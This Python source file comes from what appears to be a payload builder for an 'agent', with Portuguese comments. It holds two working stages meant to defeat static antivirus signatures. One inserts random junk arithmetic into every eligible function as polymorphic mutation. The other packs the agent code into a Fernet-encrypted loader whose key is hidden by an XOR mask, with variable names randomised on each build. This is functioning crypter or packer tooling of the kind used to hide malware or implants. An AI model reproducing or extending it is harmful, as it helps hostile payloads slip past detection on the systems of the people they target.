# strategies/mutation.py

import ast
import os
import random
import string
from .base import BuildContext, ObfuscationStrategy
import base64
from cryptography.fernet import Fernet
from .base import BuildStrategy
from rich.console import Console
console = Console()
# --- O Cérebro: O Transformer que insere o código lixo ---

class JunkCodeTransformer(ast.NodeTransformer):
    """
    Este transformer visita cada função no código e insere um bloco de
    código lixo (cálculos matemáticos inúteis) no início dela.
    """

    def _generate_junk_block(self) -> list[ast.AST]:
        """
        Gera uma lista de nós AST representando cálculos matemáticos inúteis,
        com operações e valores variados para aumentar a aleatoriedade.
        """
        nodes = []
        var1_name = '_junk_' + ''.join(random.choices(string.ascii_lowercase, k=8))
        var2_name = '_junk_' + ''.join(random.choices(string.ascii_lowercase, k=8))
        
        # --- INÍCIO DA MELHORIA ---
        # Valores e operadores aleatórios
        initial_value = random.randint(10000, 99999)
        multiplier = random.randint(2, 10)
        subtractor = random.randint(1000, 5000)
        
        # Escolhe aleatoriamente um par de operadores para as duas etapas principais
        op_choices = [
            (ast.Mult, ast.Add), 
            (ast.Add, ast.Sub), 
            (ast.Div, ast.Mult),
            (ast.Sub, ast.Div)
        ]
        op1, op2 = random.choice(op_choices)
        # --- FIM DA MELHORIA ---

        # 1. _junk_var_1 = 12345
        nodes.append(ast.Assign(
            targets=[ast.Name(id=var1_name, ctx=ast.Store())],
            value=ast.Constant(value=initial_value)
        ))
        
        # 2. _junk_var_2 = _junk_var_1 [OP1] multiplier
        nodes.append(ast.Assign(
            targets=[ast.Name(id=var2_name, ctx=ast.Store())],
            value=ast.BinOp(
                left=ast.Name(id=var1_name, ctx=ast.Load()),
                op=op1(), # Usa o operador escolhido
                right=ast.Constant(value=multiplier)
            )
        ))

        # 3. _junk_var_1 = _junk_var_2 [OP2] subtractor
        nodes.append(ast.Assign(
            targets=[ast.Name(id=var1_name, ctx=ast.Store())],
            value=ast.BinOp(
                left=ast.Name(id=var2_name, ctx=ast.Load()),
                op=op2(), # Usa o segundo operador escolhido
                right=ast.Constant(value=subtractor)
            )
        ))

        return nodes

    def visit_FunctionDef(self, node: ast.FunctionDef) -> ast.FunctionDef:
        """
        Este método é chamado para cada definição de função (`def ...`) no código.
        """
        # Não insere lixo em funções muito pequenas ou especiais (ex: __init__)
        if len(node.body) < 2 or node.name.startswith('__'):
            return node # Retorna a função original sem modificá-la

        # Gera um novo bloco de código lixo
        junk_block = self._generate_junk_block()
        
        # Insere o bloco de lixo no início do corpo da função
        # reversed() é usado porque estamos inserindo na posição 0 várias vezes
        for junk_node in reversed(junk_block):
            node.body.insert(0, junk_node)
            
        # Corrige as informações de localização (número da linha, etc.) para os novos nós
        ast.fix_missing_locations(node)
        
        return node

# --- A Estratégia que usa o Transformer ---

class JunkCodeInsertionStrategy(ObfuscationStrategy):
    """
    Aplica mutações polimórficas inserindo código lixo nas funções.
    """
    def execute(self, context: BuildContext) -> BuildContext:
        source_code = context.entry_script_path.read_text(encoding="utf-8")
        tree = ast.parse(source_code)
        
        transformer = JunkCodeTransformer()
        mutated_tree = transformer.visit(tree)
        
        # Salva o código mutado de volta no arquivo de entrada do contexto
        context.entry_script_path.write_text(ast.unparse(mutated_tree), encoding="utf-8")
        
        return context

class LoaderPackingStrategy(ObfuscationStrategy):
    """
    Estratégia para empacotar o payload do agente dentro de um loader criptografado.
    Esta etapa deve ocorrer após todas as modificações no código do agente e
    antes da etapa de compilação.
    """
    def execute(self, context):
        # ==================================================================
        #                       INÍCIO DA CORREÇÃO
        # ==================================================================
        # Trocado self.console.print por print() padrão
        print("[yellow]Iniciando empacotamento com loader criptografado...[/yellow]")

        # Caminho para o template do loader
        loader_template_path = context.base_dir / 'strategies' / 'loader_template.py'
        if not loader_template_path.exists():
            raise FileNotFoundError(f"Template do loader não encontrado em: {loader_template_path}")

        # 1. Ler o código do agente atual (pode já ter sido ofuscado)
        print(f"  -> Lendo código do agente de: [cyan]{context.entry_script_path.name}[/cyan]")
        agent_code = context.entry_script_path.read_text(encoding='utf-8')

        # 2. Gerar uma chave de criptografia e criptografar o payload
        print("  -> Gerando chave AES e criptografando o payload...")
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted_payload = cipher.encrypt(agent_code.encode('utf-8'))

        # 3. Codificar payload e gerar snippet XOR para ofuscar a chave
        payload_b64 = base64.b64encode(encrypted_payload).decode('utf-8')

        # Gera nomes de variável aleatórios a cada build (anti-assinatura estática)
        import secrets as _sec, string as _str
        def _rvar(n=6):
            return '_' + ''.join(_sec.choice(_str.ascii_lowercase + _str.digits) for _ in range(n))
        _vkx, _vkm = _rvar(), _rvar()

        # XOR da chave bruta com mask aleatório gerado em build time
        key_mask = os.urandom(len(key))
        key_xored = bytes(a ^ b for a, b in zip(key, key_mask))
        kx_lit = ", ".join(str(b) for b in key_xored)
        km_lit = ", ".join(str(b) for b in key_mask)

        # Snippet embutido no loader: reconstrói _FKEY via XOR em runtime
        # Nenhuma string legível da chave aparece no binário final
        key_reconstruction = (
            f"{_vkx} = bytes([{kx_lit}])\n"
            f"{_vkm} = bytes([{km_lit}])\n"
            f"_FKEY = bytes(_a ^ _b for _a, _b in zip({_vkx}, {_vkm}))"
        )

        # 4. Ler o template do loader e injetar os dados
        print("  -> Injetando payload criptografado no template do loader...")
        loader_code = loader_template_path.read_text(encoding='utf-8')

        loader_code = loader_code.replace("%%ENCRYPTED_PAYLOAD%%", payload_b64)
        loader_code = loader_code.replace("%%KEY_RECONSTRUCTION%%", key_reconstruction)

        # 5. Sobrescrever o script de entrada com o código do loader
        context.entry_script_path.write_text(loader_code, encoding='utf-8')
        print(f"  -> [green]Sucesso![/green] O script de entrada foi substituído pelo loader.")
        # ==================================================================
        #                        FIM DA CORREÇÃO
        # ==================================================================
        
        return context
